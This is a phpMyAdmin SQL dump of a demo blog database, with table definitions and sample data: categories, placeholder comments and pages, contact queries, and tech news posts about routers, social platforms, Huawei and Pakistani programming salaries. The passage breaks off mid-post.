-- phpMyAdmin SQL Dump
-- version 5.1.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Oct 02, 2021 at 04:09 PM
-- Server version: 10.4.18-MariaDB
-- PHP Version: 7.3.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `blog`
--

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(11) NOT NULL,
  `cat_title` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `cat_title`) VALUES
(1, 'Technology'),
(2, 'Social'),
(3, 'Programming'),
(4, 'Hacking'),
(5, 'Blogging'),
(6, 'Others'),
(7, 'News');

-- --------------------------------------------------------

--
-- Table structure for table `cat_links`
--

CREATE TABLE `cat_links` (
  `id` int(11) NOT NULL,
  `catid` int(11) NOT NULL,
  `postid` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `cat_links`
--

INSERT INTO `cat_links` (`id`, `catid`, `postid`) VALUES
(5, 2, 3),
(6, 1, 4),
(7, 1, 5),
(16, 1, 11),
(17, 1, 12),
(18, 7, 12),
(26, 5, 17),
(37, 1, 13),
(38, 3, 13),
(39, 1, 10),
(40, 7, 10),
(41, 1, 9),
(42, 7, 8),
(43, 1, 2),
(61, 1, 27),
(62, 7, 27),
(63, 1, 28),
(64, 6, 28),
(65, 6, 29),
(66, 4, 30),
(67, 1, 6),
(68, 1, 7),
(69, 2, 7),
(70, 7, 7),
(71, 5, 19),
(72, 5, 18),
(74, 4, 16),
(75, 4, 15),
(76, 4, 14);

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `postid` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `useremail` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `status` varchar(255) NOT NULL DEFAULT 'draft',
  `created_at` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `postid`, `username`, `useremail`, `body`, `status`, `created_at`) VALUES
(2, 13, 'Ali', 'ali@gmail.com', 'He knew what he was supposed to do. That had been apparent from the beginning. That was what made the choice so difficult. What he was supposed to do and what he would do were not the same. This would have been fine if he were willing to face the inevitable consequences, but he wasn\'t.', 'Approved', '2021-10-02 17:00:37'),
(3, 13, 'Zeeshan', 'zeeshan@gmail.com', 'Indescribable oppression, which seemed to generate in some unfamiliar part of her consciousness, filled her whole being with a vague anguish. It was like a shadow, like a mist passing across her soul\'s summer day. It was strange and unfamiliar; it was a mood. She did not sit there inwardly upbraiding her husband, lamenting at Fate, which had directed her footsteps to the path which they had taken. She was just having a good cry all to herself. The mosquitoes made merry over her, biting her firm, round arms and nipping at her bare insteps.', 'Approved', '2021-10-02 17:01:07'),
(4, 13, 'Adnan', 'adnan@gmail.com', 'Sometimes there isn\'t a good answer. No matter how you try to rationalize the outcome, it doesn\'t make sense. And instead of an answer, you are simply left with a question. Why?', 'Approved', '2021-10-02 17:01:35');

-- --------------------------------------------------------

--
-- Table structure for table `contact_queries`
--

CREATE TABLE `contact_queries` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `message` text NOT NULL,
  `status` varchar(255) NOT NULL DEFAULT 'unread'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `contact_queries`
--

INSERT INTO `contact_queries` (`id`, `name`, `email`, `phone`, `message`, `status`) VALUES
(1, 'Yasir Ali', 'yasir@gmail.com', '03001234567', 'This is some test message.', 'read'),
(2, 'Ghulam Ali', 'ghulam123@yahoo.com', '03451234567', 'Some content for message.', 'unread');

-- --------------------------------------------------------

--
-- Table structure for table `limits`
--

CREATE TABLE `limits` (
  `id` int(11) NOT NULL,
  `postsblog` int(11) NOT NULL,
  `postsadmin` int(11) NOT NULL,
  `slider` int(11) NOT NULL,
  `loadmore` int(11) NOT NULL,
  `popular` int(11) NOT NULL,
  `random` int(11) NOT NULL,
  `postcats` int(11) NOT NULL,
  `comments` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `limits`
--

INSERT INTO `limits` (`id`, `postsblog`, `postsadmin`, `slider`, `loadmore`, `popular`, `random`, `postcats`, `comments`) VALUES
(1, 8, 8, 5, 8, 5, 5, 3, 10);

-- --------------------------------------------------------

--
-- Table structure for table `pages`
--

CREATE TABLE `pages` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `slug` varchar(255) NOT NULL,
  `content` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `pages`
--

INSERT INTO `pages` (`id`, `title`, `slug`, `content`) VALUES
(1, 'About Us', 'about-us', '<p><span class=\"marker\"><strong>This is some random text for about us page.</strong></span></p>\n\n<p>There are different types of secrets. She had held onto plenty of them during her life, but this one was different. She found herself holding onto the worst type. It was the type of secret that could gnaw away at your insides if you didn&#39;t tell someone about it, but it could end up getting you killed if you did.</p>\n\n<p>MaryLou wore the tiara with pride. There was something that made doing anything she didn&#39;t really want to do a bit easier when she wore it. She really didn&#39;t care what those staring through the window were thinking as she vacuumed her apartment.</p>\n\n<p>Do you think you&#39;re living an ordinary life? You are so mistaken it&#39;s difficult to even explain. The mere fact that you exist makes you extraordinary. The odds of you existing are less than winning the lottery, but here you are. Are you going to let this extraordinary opportunity pass?</p>\n\n<p>The river slowly meandered through the open space. It had hidden secrets that it didn&#39;t want to reveal. It had a well-planned strategy to appear calm, inviting, and appealing. That&#39;s how the river lured her unknowing victims to her water&#39;s edge.</p>\n\n<p>Have you ever wondered about toes? Why 10 toes and not 12. Why are some bigger than others? Some people can use their toes to pick up things while others can barely move them on command. Some toes are nice to look at while others are definitely not something you want to look at. Toes can be stubbed and make us scream. Toes help us balance and walk. 10 toes are just something to ponder.</p>\n\n<p>It was a concerning development that he couldn&#39;t get out of his mind. He&#39;d had many friends throughout his early years and had fond memories of playing with them, but he couldn&#39;t understand how it had all stopped. There was some point as he grew up that he played with each of his friends for the very last time, and he had no idea that it would be the last.</p>\n\n<p>There were little things that she simply could not stand. The sound of someone tapping their nails on the table. A person chewing with their mouth open. Another human imposing themselves into her space. She couldn&#39;t stand any of these things, but none of them compared to the number one thing she couldn&#39;t stand which topped all of them combined.</p>'),
(8, 'Privacy Policy', 'privacy-policy', '<p><strong>This is some random text of privacy policy page.</strong></p>\n\n<ol>\n	<li>The red glint of paint sparkled under the sun. He had dreamed of owning this car since he was ten, and that dream had become a reality less than a year ago. It was his baby and he spent hours caring for it, pampering it, and fondling over it. She knew this all too well, and that&#39;s exactly why she had taken a sludge hammer to it.</li>\n	<li>\n	<p>There wasn&#39;t a bird in the sky, but that was not what caught her attention. It was the clouds. The deep green that isn&#39;t the color of clouds, but came with these. She knew what was coming and she hoped she was prepared.</p>\n	</li>\n	<li>\n	<p>His parents continued to question him. He didn&#39;t know what to say to them since they refused to believe the truth. He explained again and again, and they dismissed his explanation as a figment of his imagination. There was no way that grandpa, who had been dead for five years, could have told him where the treasure had been hidden. Of course, it didn&#39;t help that grandpa was roaring with laughter in the chair next to him as he tried to explain once again how he&#39;d found it.</p>\n	</li>\n	<li>\n	<p>Welcome to my world. You will be greeted by the unexpected here and your mind will be challenged and expanded in ways that you never thought possible. That is if you are able to survive...</p>\n	</li>\n	<li>\n	<p>She didn&#39;t like the food. She never did. She made the usual complaints and started the tantrum he knew was coming. But this time was different. Instead of trying to placate her and her unreasonable demands, he just stared at her and watched her meltdown without saying a word.</p>\n	</li>\n	<li>\n	<p>It was easy to spot her. All you needed to do was look at her socks. They were never a matching pair. One would be green while the other would be blue. One would reach her knee while the other barely touched her ankle. Every other part of her was perfect, but never the socks. They were her micro act of rebellion.</p>\n	</li>\n	<li>\n	<p>He heard the loud impact before he ever saw the result. It had been so loud that it had actually made him jump back in his seat. As soon as he recovered from the surprise, he saw the crack in the windshield. It seemed to be an analogy of the current condition of his life.</p>\n	</li>\n	<li>\n	<p>The leather jacked showed the scars of being his favorite for years. It wore those scars with pride, feeling that they enhanced his presence rather than diminishing it. The scars gave it character and had not overwhelmed to the point that it had become ratty. The jacket was in its prime and it knew it.</p>\n	</li>\n	<li>\n	<p>April seriously wondered about her sleeping partner choices. She looked at her bed and what a mess it had become. How did she get to the point in her life where she had two dogs, three cats, and a raccoon sleeping with her every night?</p>\n	</li>\n	<li>\n	<p>She has seen this scene before. It had come to her in dreams many times before. She had to pinch herself to make sure it wasn&#39;t a dream again. As her fingers squeezed against her arm, she felt the pain. It was this pain that immediately woke her up.</p>\n	</li>\n	<li>\n	<p>She sat in the darkened room waiting. It was now a standoff. He had the power to put her in the room, but not the power to make her repent. It wasn&#39;t fair and no matter how long she had to endure the darkness, she wouldn&#39;t change her attitude. At three years old, Sandy&#39;s stubborn personality had already bloomed into full view.</p>\n	</li>\n	<li>\n	<p>At that moment he had a thought that he&#39;d never imagine he&#39;d consider. &quot;I could just cheat,&quot; he thought, &quot;and that would solve the problem.&quot; He tried to move on from the thought but it was persistent. It didn&#39;t want to go away and, if he was honest with himself, he didn&#39;t want it to.</p>\n	</li>\n	<li>\n	<p>Her mom had warned her. She had been warned time and again, but she had refused to believe her. She had done everything right and she knew she would be rewarded for doing so with the promotion. So when the promotion was given to her main rival, it not only stung, it threw her belief system into disarray. It was her first big lesson in life, but not the last.</p>\n	</li>\n	<li>\n	<p>He watched as the young man tried to impress everyone in the room with his intelligence. There was no doubt that he was smart. The fact that he was more intelligent than anyone else in the room could have been easily deduced, but nobody was really paying any attention due to the fact that it was also obvious that the young man only cared about his intelligence.</p>\n	</li>\n	<li>\n	<p>She needed glasses. It wasn&#39;t that she couldn&#39;t see without them, but what she could see with them. When she wore glasses, her eyes focused so deeply that she could see not only the physical but also beyond. It was like a superpower. But she needed glasses.</p>\n	</li>\n</ol>');

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `slug` varchar(255) NOT NULL,
  `author` varchar(255) NOT NULL,
  `date` datetime NOT NULL DEFAULT current_timestamp(),
  `content` longtext NOT NULL,
  `thumbnail` varchar(255) NOT NULL,
  `view_count` int(11) NOT NULL,
  `status` varchar(255) NOT NULL DEFAULT 'draft'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `title`, `slug`, `author`, `date`, `content`, `thumbnail`, `view_count`, `status`) VALUES
(2, 'Here is why your internet randomly stops working', 'here-is-why-your-internet-randomly-stops-working', 'admin', '2021-09-23 15:57:30', '<p>This is an issue that has probably happened to nearly everyone who regularly uses the internet. You&rsquo;re probably downloading/uploading something or even streaming a video and all of a sudden your internet fails to temporarily. Hence you find it convenient to smash your router or complain to your Internet Service Provider. There are even scenarios where you may have gone to check your internet router and notice some indication that the internet is not working.</p>\n\n<p>The usual method of fixing it (which we all have done) is unplugging the router, waiting for a few minutes, then replugging it, and voila&rsquo; your internet is back up again. But why does this happen all the time? Is it because our Internet Service Providers just hate seeing us happily using the internet or something? Well actually, there are numerous reasons as to why our internet temporarily fails us over and over.</p>\n\n<p>First of all, it is a huge misconception that our routers are these magical boxes that provide us internet connectivity out of the blue. It&rsquo;s what&rsquo;s under the hood that counts because similar to our normal desktop PC, our routers have their own CPU, memory, and even an operating system which all play a crucial role in managing the data traffic and then deciding what needs to be sent and where. Moreover, these components can get overloaded similar to how a PC gets overloaded due to handling numerous tasks. So if you have a ton of devices connected to your router then chances are that there is a huge strain on the router itself which results into a sudden halt in terms of providing internet.</p>\n\n<p>This normally happens as our routers use dynamic IP addresses which basically assign IP addresses to help the route navigate through the internet traffic better and find your device. This is kind of like how street addresses work except it&rsquo;s all about the internet. So the IP address assigned stays with the router for a short period of time and then expires and then our ISP provides a new IP address and the rest happens as usual.</p>\n\n<p>So if you are downloading/uploading a heavy file while the router is aiming to shift to a new IP address then you may face certain issues with your internet.</p>\n\n<p>Another reason why our internet fails is normally that most users shove their internet router in a closed cozy space which is not recommended as even a router can heat up and cause problems. Hence it is recommended that your router should be placed in a proper open area where there is cross-ventilation. Just don&rsquo;t place the router under the sun, please.</p>\n\n<p>in addition, most of our WiFi routers that use the 2.4GHz band face interference from other household devices such as microwave ovens which overlap and make it difficult for your router to provide proper internet to your device. You can oversee this issue by downloading a simple mobile app that looks at nearby networks and helps you change your router settings. However, if you are not that tech-savvy it is recommended that you talk to the customer care representatives of your Internet Service Provider.</p>\n\n<p>Let us know in the comments how this article helped you solve your buggy internet issue or what other methods you may have tried.</p>', '1632394650image-asset.jpeg', 3, 'Published'),
(3, 'Twitter is aiming to fix disappearing tweets issue soon', 'twitter-is-aiming-to-fix-disappearing-tweets-issue-soon', 'admin', '2021-09-23 15:59:11', '<p>In recent news, Twitter is planning to make some changes to its platform that would prevent tweets from disappearing as you read them. This is a problem that you may or may not have faced, but if you were reading a tweet on your timeline and at the same time someone else replied to it then the original tweet would disappear.</p>\n\n<p>This is something that the company is willing to fix soon. They mentioned this recently on their Twitter Support account.</p>\n\n<p>Moreover, the company made it much simpler by replying to a user as follows:<br />\n<em>&ldquo;We want you to be able to stop and read a Tweet without it disappearing from view.&rdquo;</em></p>\n\n<p>This will take around two months hence this feature won&rsquo;t be fixed immediately so you might face these disappearing tweets issues for a while. Though Twitter hasn&rsquo;t released a proper date in regards to the fixing of this issue the company is aiming to make necessary changes as soon as possible.</p>', '1632394751twitter-1-1024x576.jpg', 1, 'Published'),
(4, 'YouTube is working on a video downloads feature for desktop browser', 'youtube-is-working-on-a-video-downloads-feature-for-desktop-browser', 'admin', '2021-09-23 16:00:53', '<p>So far users have taken much advantage of the download video option on the YouTube mobile app, however, the platform is now testing an official way to download videos on your desktop web browser. In order to check out this feature presently, users will have to go through YouTube&rsquo;s experimental features page which currently lists tests available for Premium subscribers. Once opted in, all you would need is a proper browser that is updated.</p>\n\n<p>When you play a video you will see a new download button near the video. Once you click on the button, YouTube will download the video which can then be viewed from the &lsquo;Downloads&rsquo; section. The section would be accessible from the hamburger-like icon present on the left side of the screen. However, it is to be noted that you can only view these downloaded videos through your browser.</p>\n\n<p>Moreover, do be aware that this feature is currently &lsquo;experimental&rsquo; hence there might be a few bugs along the way. If you want to check out the feature early on, you can head to the experimental features page by clicking&nbsp;<a href=\"https://www.youtube.com/new\" target=\"_blank\">here</a>.</p>', '1632394853acastro_180403_1777_youtube_0002.0-1024x512.jpg', 1, 'Published'),
(5, 'Twitch has revealed a new process of dealing with unauthorized music usage', 'twitch-has-revealed-a-new-process-of-dealing-with-unauthorized-music-usage', 'admin', '2021-09-23 16:02:23', '<p>Despite Twitch striking a deal with the National Music Publishers&rsquo; Association (NMPA), streamers are still unable to use songs legally in their streams. Knowing this situation, Twitch has informed creators via email that it is working on a new process that will allow publishers and right holders to properly report content.</p>\n\n<p>This process is rather unique as it will first start with a warning instead of giving a direct penalty. In a nutshell, when a rights holder reports a stream, Twitch will first issue a warning and remove the clips which contain the unauthorized music. Moreover, in case of any flagrant violations such as rebroadcasting an entire show then a direct penalty may be issued. However, this depends on the user&rsquo;s track record and how much illegal activity does he or she has under his or her belt.</p>\n\n<p>Twitch will also remove videos in case of any disputes between creators.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Moreover, Billboard mentioned that Twitch and the NMPA have agreed on a time window to hash out music which will be handled on the platform going forward. In addition, the new reporting process will take some time hence the platform will share information with the respective creators on Twitch in a few week&rsquo;s time.</p>', '1632394943acastro_200901_1777_twitch_0003.0-1024x512.jpg', 0, 'Published'),
(6, 'This robotic backpack follows you wherever you go', 'this-robotic-backpack-follows-you-wherever-you-go', 'admin', '2021-09-23 16:03:44', '<p>Around 2019, Boston&rsquo;s Piaggio Fast Forward (PFF) company had released the first-ever automated cargo hauler for pedestrians known as the Gita. Two years later, the company has now released a more nimble version of the Gita which is now known as the Gitamini.</p>\n\n<p>The original Gita was capable of carrying up to 44 pounds of luggage and items with a traveling speed of 22 mph. However, the Gitamini wights around 28 pounds and can carry up to 20 pounds of gear and due to the external handles, the mini can be hoisted over stairs and other obstacles. The mini works for about six hours before needing a recharge.</p>\n\n<p>In addition, the mini now features advanced optics and machine vision which allows the mini to recognize and follow its leader using only visual and radar cues like color and motion. In a nutshell, no internet or GPS is required for this.</p>\n\n<p>The Gitamini is also equipped with &lsquo;pedestrian etiquette software&rsquo; which basically allows the robot to follow its leader at a safe distance while anticipating people in the environment. According to Greg Lynn, CEO at PFF:<br />\n<em>&ldquo;Seeing the initial consumer response to Gita proved to us what a pioneer the product was within the consumer robotics industry. The ask to ourselves then became, &lsquo;how do we take what we have heard from people and create something different for a new segment of consumers?&rsquo;&rsquo;</em></p>\n\n<p>The Gitamini has a price tag of $1,850 and will go on sale around October 15th. Moreover, the original Gita will be priced at around $3,250.</p>', '1633182832.jpeg', 3, 'Published'),
(7, 'Facebook launches video calling devices', 'facebook-launches-video-calling-devices', 'admin', '2021-09-23 16:04:43', '<p>Facebook has officially launched its own range of video calling devices called the Portal Go and the Portal+. These devices are built with portability in mind so that these devices can be used and taken anywhere.</p>\n\n<p>The Portal Go has a 10-inch screen with a 12MP ultra-wide camera which would be utilized for immersive video calls. In addition, it can also work as a Bluetooth speaker by connecting to any of your devices and play your favorite music.</p>\n\n<p>On the other hand, the Portal+ rocks a bigger 14-inch screen and stereo speakers to ensure high-end audio. However, the camera is the same as the Go model.</p>\n\n<p>Aside from music playing and video calling, these devices can also be used to make a digital photo frame which can be shared on Facebook and Instagram. Facebook is said to add support for Microsoft teams for their respective Portal devices. In addition, the Portal devices are said to feature long-lasting battery life.</p>', '1633182905.jpeg', 1, 'Published'),
(9, 'Code for Pakistan Collaborates with National Institute of Health  to Launch First Ever TECH NIH Fellowship Program', 'code-for-pakistan-collaborates-with-national-institute-of-health-nih-to-launch-first-ever-tech-nih-fellowship-program', 'admin', '2021-09-23 16:08:59', '<p>Code for Pakistan and Pakistan&rsquo;s National Institute of Health (NIH) are collaborating on a three-month pilot program aimed at co-creating digital technology to help the nation&rsquo;s most established health institution make better use of their resources, improving quality, efficiency, and ultimately, the experience of every patient. The new technologies derived from the program will also help to bring about better integration of care, and improve the health of the wider population in Pakistan.</p>\n\n<p>The seven TECH-NIH Fellows for 2021 have been identified after a rigorous application and interview process that was designed specifically to identify talented technologists whose insights, learnings, and broad visions will strengthen the institution. They will be responsible for conducting user research, product development, and improving service delivery, based on the needs of the NIH.</p>\n\n<p>Of the program, Chief Information Officer at the NIH, Muhammad Khan says,&nbsp;<em>&ldquo;TECH-NIH is proud of the diversity we have on our team. We have a talented staff that is specialized in several areas of Information Technology, but what we needed was a strong software development arm. This Fellowship that we have put together with Code for Pakistan&rsquo;s support is a real game-changer for all of us, and we at the NIH are all looking forward to working with our Fellows on several software applications that are critical and would hugely contribute towards much-needed health initiatives in our country.&rdquo;</em></p>\n\n<p>Ali Raza, Code for Pakistan&rsquo;s Director of Technology, said,&nbsp;<em>&ldquo;We are so proud of the lead that the NIH has taken in digitizing health services, and we&rsquo;re eager to see what can come from this three-month pilot program. As the pandemic continues, our hope is that the NIH sees enough value in this Fellowship to carry it forward and lead the country towards greater innovation.&rdquo;</em></p>', '1632395339cfp-logo-1024x447.png', 0, 'Published'),
(10, 'Huawei Releases Multiple Smart Office Devices and Number of Users Upgraded to HarmonyOS 2 Surpasses 100 Million', 'huawei-releases-multiple-smart-office-devices-and-number-of-users-upgraded-to-harmonyos-2-surpasses-100-million', 'akram123', '2021-09-23 16:13:50', '<p>On September 13 at the new smart office product launch event, Huawei released several new products, including the HUAWEI MateBook 13s, MateBook 14s, HUAWEI MateStation X desktop PC, HUAWEI MateView GT 27 monitor, and HUAWEI PixLab X1 printer. It also announced that the number of users who have upgraded their devices to HarmonyOS 2 has passed the 100 million mark.</p>\n\n<p><em>&ldquo;This is an exciting milestone and we are grateful to our consumers and partners for their support!&rdquo;</em>&nbsp;said Richard Yu, Executive Director and CEO of Consumer Business Group. He added,&nbsp;<em>&ldquo;HarmonyOS brings users a simpler way to connect, superior user experience, and more convenient services with multiple devices for different scenarios. At the same time, HarmonyOS will become the operating system based in the Internet of Everything era as Huawei works with partners to build an open, open-source, and trustworthy smart industry ecosystem for shared success. A spark can start a fire, and millions of stars converge into a vast celestial landscape!&rdquo;</em></p>\n\n<p>HarmonyOS 2 was installed at a record-breaking rate after the upgrade being made available on June 2 for over 100 device models including smartphones and tablets. It reached 10 million users just one week after release. That number rose to 30 million on July 8. On September 12, 3 months after launch, the number of users upgraded hit the 100 million mark. No other mobile operating system has ever reached 100 million users in such a short span.</p>\n\n<p>As a cutting-edge operating system for smart devices, HarmonyOS allows different types of devices to connect and communicate with each other through a common language. In the state-of-the-art Control Panel, you can drag an icon of one device to that of another to connect the two, allowing you to use multiple devices as easily as using one.&nbsp;</p>\n\n<p>Users can customize their home screen with widgets of different sizes to suit their own personal style. Widgets also allow them to easily access atomic services such as news and the calendar without even opening an app. HarmonyOS 2 boasts superior performance and smoother operations and allows users to have longer gaming sessions and always get back to where they were when multiple apps are used. These new features enable users to experience a simple, smooth, continuous, secure, and reliable Seamless AI Life, allowing upgrade satisfaction to reach an all-time high.</p>\n\n<p>Also included in this launch event was a new category of product, the HUAWEI PixLab X1 printer running HarmonyOS. This product is a critical part of Huawei&rsquo;s smart office series for a Seamless AI Life and provides cutting-edge printing technology. Users can connect the printer via Bluetooth to nearby HUAWEI products including phones, tablets, or PCs through the popup window on the screen. This process takes as little as 20 seconds. The PixLab X1 creates a simple and efficient printing experience that supports Tap to Print, making easy-to-access and smarter technology available to all.</p>\n\n<p>HarmonyOS 2 has been enthusiastically received by users. To meet user demands, Huawei has invested heavily in R&amp;D to adapt HarmonyOS 2 to nearly 100 different device models one quarter ahead of schedule. This will enable more and more old models to enjoy the innovative functions and improved user experience of HarmonyOS.&nbsp;</p>\n\n<p>HarmonyOS has not only piqued the enthusiasm of consumers but has also attracted a large number of developers and partners to the HarmonyOS ecosystem. The number of HarmonyOS developers has surpassed 1.3 million, a ten-fold increase over last year. More than 1000 hardware vendors, such as Midea and Joyoung, have embraced HarmonyOS Connect to help create a more convenient user experience, which includes simplified connection and interaction, service widgets, and hardware capability sharing. Top platforms such as JD.com, Youku, and Sina News have developed easily accessible HarmonyOS apps and services that have greatly improved user retention and activity.</p>\n\n<p>In the future, Huawei will continue to contribute code to the OpenHarmony open source project to help it grow and improve, allowing developers in diverse industries to build next-generation operating systems based on OpenHarmony, further enabling digitalization and intelligent development.</p>', '16323956301m-en-1024x576.png', 0, 'Published'),
(11, 'Pakistani AI expert highlights importance of making country AI ready', 'pakistani-ai-expert-highlights-importance-of-making-country-ai-ready', 'akram123', '2021-09-23 16:15:03', '<p>Dr Masood Mehmood Khan, a Pakistani artificial intelligence expert, strongly believes that it is necessary to transform Pakistan into a tech-savvy and AI-ready nation so that it is prepared to meet future challenges.&nbsp;</p>\n\n<p><a href=\"https://www.brecorder.com/news/40119780/expert-underscores-need-for-transforming-country-into-a-tech-savvy-state\" target=\"_blank\">As reported by&nbsp;<em>Business Recorder</em></a>, Dr Masood says that artificial intelligence is an unprecedented form of revolution that will continue to change the way we think, work, and interact.&nbsp;</p>\n\n<p>Dr Masood is a fellow of Higher Education Academy (UK) who is currently working with the faculty of science and engineering at Curtin University in Perth, Australia. As an expert in the field, he is incredibly aware of the significance of AI technologies in the modern age. He insists that Pakistan cannot afford to stay outside the realm of AI and that it needs to get ready for it.&nbsp;</p>\n\n<p>The expert believes that it&rsquo;s a tragedy that a general lack of understanding of AI has spelt negative outcomes for underdeveloped societies all over the world. The report cites businesses in developing countries failing to protect their customers&rsquo; interests as an example of how people are still largely unaware of how AI can affect them.&nbsp;</p>\n\n<p>Dr Masood points out several applications of artificial intelligence in the modern world that makes it impossible to ignore its importance. From classifying news articles in the field of journalism to helping doctors accurately diagnose diseases, AI is pretty much present in all aspects of life.&nbsp;</p>\n\n<p>In order for Pakistan to survive as a respectable and modern nation, the expert believes that we must prepare to avoid the underlying threats and reap the benefits of this AI revolution. Even though we are late, we can still develop an appropriate AI vision and strategies confidently enter the emerging AI world.&nbsp;</p>\n\n<p>Dr Masood recommends including basic AI knowledge in the nation&rsquo;s high school curriculum and a beginner AI course as a subject of study in grades 11 and 12 as a first step. With appropriate academic oversight, students will be able to understand vital concept and put them to practice from a relatively early age.&nbsp;</p>', '1632395703ai-pak.jpg', 3, 'Published'),
(12, 'Huawei Pakistan launches its Tiger Program 2021', 'huawei-pakistan-launches-its-tiger-program-2021', 'akram123', '2021-09-23 16:15:57', '<p>Huawei Pakistan in collaboration with EZY Technologies organized the launching ceremony of the Huawei Pakistan Tiger Program 2021. This program is designed to prepare an elite class of technology leaders who will be masters in their respective assigned technologies. This program will provide focused mentorship to individuals so that they are capable of elaborating business as well as technical advantages of the solution and will become future leaders in the Pakistan ICT industry.</p>\n\n<p>This 1-1 mentorship will be driving through the Regional/HQ Technology Experts via focused sessions and hands-on cloud demo sessions. After the successful completion of the program, the participants will go through extensive evaluation criteria. The candidates, who pass the evaluation, will be awarded the membership of the Pakistan Technology Tiger club in their respective technology along with prizes and recognition.</p>\n\n<p>Speaking at the occasion, Mr. Shahzad Rasheed, CTO EBG &ndash; Huawei Pakistan said,&nbsp;<em>&ldquo;Huawei Pakistan is continuously investing in the ICT resource development by enabling their Partnered ICT companies. These resources will be highly valuable for the future ICT industry and will be contributing in Digital Pakistan making a fully connected intelligent Pakistan&rdquo;.</em></p>\n\n<p>While addressing the candidates, Mr. Adnan Zafar, Director EBG &ndash; Huawei Pakistan, highlighted the key aspects of the Tiger Program and explained how this program will help in producing technology experts in the ICT industry of Pakistan.</p>\n\n<p>Mr. Shanxiaoping, Director Channels &ndash; Huawei Pakistan also spoke during the occasion and mentioned,&nbsp;<em>&ldquo;Huawei is working in Pakistan for more than 20 years and is committed to investing more to develop its Partner ecosystem. We believe, we will develop good partners if we invest in their resource development and this exactly is the purpose of this program.&rdquo;</em></p>\n\n<p>The event was attended by top management of Huawei Channels Partners, Tech Access Pakistan, Wateen Solutions, New Horizon, CMC, CNSE, and EZY Technologies and they applauded the investment Huawei is doing for the enablement and professional growth of the local talent.</p>\n\n<p>Mr. Tariq Malik, CEO of Tech Access Pakistan, also address the candidates and emphasized the importance of learning new skills and technologies to boost their professional careers.</p>', '1632395757Huawei-picture.jpg', 0, 'Published'),
(13, 'The highestpaying entry level programming job in Pakistan according to PASHA survey', 'the-highest-paying-entry-level-programming-job-in-pakistan-according-to-pasha-survey', 'akram123', '2021-09-23 16:17:13', '<p>It should come as no surprise that Pakistan is making steady progress in the domain of information technology.</p>\n\n<p>Be it the fact that that more and more local startups are benefiting from incredible rounds of investment, or the fact that the country&nbsp;<a href=\"https://www.dawn.com/news/1637074#:~:text=ISLAMABAD%3A%20Pakistan\'s%20exports%20of%20information,in%20the%20outgoing%20fiscal%20year.\" target=\"_blank\">recently crossed the $2 billion mark</a>&nbsp;in terms of IT exports, we are looking towards an IT-dominated future.</p>\n\n<p>Naturally, this means that jobs in the IT sector are not just surging, but they are also becoming more lucrative. Most founders agree that the biggest challenge for IT startups is competing for a limited pool of talent, especially during a time when remote work is on the rise.</p>\n\n<p>So, how costly is it for companies to hire and retain developers and programmers? Thanks to the findings of a recent Pakistan Software House Association (PASHA) salary survey&nbsp;<a href=\"https://www.dawn.com/news/1644626\" target=\"_blank\">shared by&nbsp;<em>Dawn</em></a>, we now have a better idea of how much programmers in Pakistan can bag when they embark on their journey.</p>\n\n<h2><strong>Average monthly pay</strong></h2>\n\n<p>Unsurprisingly, a programmer can reap a pretty decent income on average, at all levels of seniority.</p>\n\n<p>The average monthly salary for an entry-level programmer is PKR 51,344, while a senior developer with over six years of experience in the field can expect to pocket PKR 215,723 per month on average.</p>\n\n<p>If anything, these figures are reflective of the enormous potential for growth in the industry. But, we all know some skills are rewarded more than others. So which tech stack or programming skill is the most lucrative in Pakistan?</p>\n\n<h2><strong>The most rewarding programming skills in Pakistan</strong></h2>\n\n<p>MERN/MEAN/full-stack developers possess the highest average monthly salaries in the programming realm in Pakistan.</p>\n\n<p>Entry-level full-stack developers earn over PKR 61,000 per month, which increases to PKR 101,000 for junior developers with 1-3 years of experience, PKR 160,000 for mid-level developers with 3-6 years of experience, and PKR 233,534 for senior resources.</p>\n\n<p>In terms of lucrative tech stacks, Python, Ruby, and Node are other technologies that are right up there.</p>\n\n<p>The following are some other high-paying roles in the Pakistani tech sphere, with their average monthly salaries:</p>\n\n<ul>\n	<li>3D animator (entry-level): PKR 70,000</li>\n	<li>Data scientist/miner (junior-level): PKR 106,765</li>\n	<li>Game developers (mid-level): PKR 262,500</li>\n	<li>Game developers (senior-level): PKR 412,500</li>\n</ul>\n\n<p>&nbsp;</p>\n\n<p>Time to look at yet another interesting perspective with regards to programming jobs: impact of education.</p>\n\n<h2><strong>Impact of education credentials on tech jobs in Pakistan</strong></h2>\n\n<p>Jobs in the tech sector involve a plethora of skills, most of which are only possible via education, be it within the halls of a 